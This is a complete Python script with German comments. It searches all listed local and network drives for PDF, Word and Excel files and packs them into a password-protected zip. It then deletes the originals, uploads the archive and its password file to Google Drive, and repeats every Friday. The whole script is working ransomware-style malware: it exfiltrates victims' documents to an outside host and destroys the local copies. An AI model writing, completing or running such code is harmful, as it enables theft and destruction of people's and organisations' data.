import os
import random
import string
import datetime
import time
import docx2txt
import pyzipper
from pydrive.auth import GoogleAuth
from pydrive.drive import GoogleDrive


# Funktion zum Generieren eines Passworts
def generate_password(length=10):
    characters = string.ascii_letters + string.digits + string.punctuation
    password = "".join(random.choice(characters) for _ in range(length))
    return password


# Funktion zum Zippen von Dateien mit Passwort
def zip_files_with_password(password, zip_filename, files):
    with pyzipper.AESZipFile(zip_filename, "w", compression=pyzipper.ZIP_LZMA) as zf:
        zf.setpassword(password.encode())
        for file in files:
            zf.write(file)


# Funktion zum Durchsuchen von Laufwerken und Sammeln von Dateien
def search_files(start_path):
    files = []
    for root, _, filenames in os.walk(start_path):
        for filename in filenames:
            extension = os.path.splitext(filename)[1].lower()
            if extension == ".pdf":
                files.append(os.path.join(root, filename))
            elif extension in [".doc", ".docx"]:
                text = docx2txt.process(os.path.join(root, filename))
                if text:
                    files.append(os.path.join(root, filename))
            elif extension == ".xlsx":
                files.append(os.path.join(root, filename))
    return files


# Funktion zum Löschen der Originaldateien
def delete_files(files):
    for file in files:
        os.remove(file)


# Funktion zum Hochladen der ZIP-Dateien auf Google Drive
def upload_zip_files(zip_filenames, password_filename):
    gauth = GoogleAuth()
    drive = GoogleDrive(gauth)

    for zip_filename in zip_filenames:
        file = drive.CreateFile({"title": zip_filename})
        file.SetContentFile(zip_filename)
        file.Upload()

    password_file = drive.CreateFile({"title": password_filename})
    password_file.SetContentFile(password_filename)
    password_file.Upload()


# Hauptprogramm
def main():
    # Durchsuchen aller Laufwerke inklusive Netzwerklaufwerken
    drives = [
        "C:",
        "D:",
        "E:",
        "F:",
        "G:",
    ]  # Fügen Sie hier alle relevanten Laufwerksbuchstaben hinzu
    network_drives = [
        "Z:",
        "Y:",
    ]  # Fügen Sie hier alle relevanten Netzwerklaufwerksbuchstaben hinzu

    all_files = []
    for drive in drives:
        all_files.extend(search_files(drive))
    for network_drive in network_drives:
        all_files.extend(search_files(network_drive))

    # Generieren des Passworts und Speichern in einer Textdatei
    password = generate_password()
    password_filename = "password.txt"
    with open(password_filename, "w") as file:
        file.write(password)

    # Zippen der Dateien mit Passwort
    zip_filename = "files.zip"
    zip_files_with_password(password, zip_filename, all_files)

    # Löschen der Originaldateien
    delete_files(all_files)

    # Hochladen der ZIP-Dateien auf Google Drive
    upload_zip_files([zip_filename], password_filename)

    # Löschen der erstellten ZIP-Dateien auf dem lokalen Rechner
    os.remove(zip_filename)
    os.remove(password_filename)


while True:
    next_friday = datetime.datetime.combine(
        datetime.date.today()
        + datetime.timedelta(days=(4 - datetime.date.today().weekday()) % 7),
        datetime.time(0, 0),
    )
    now = datetime.datetime.now()
    if now >= next_friday:
        main()
        next_friday += datetime.timedelta(weeks=1)  # Nächsten Freitag berechnen
    time.sleep(60)  # 60 Sekunden warten, um Ressourcen zu schonen
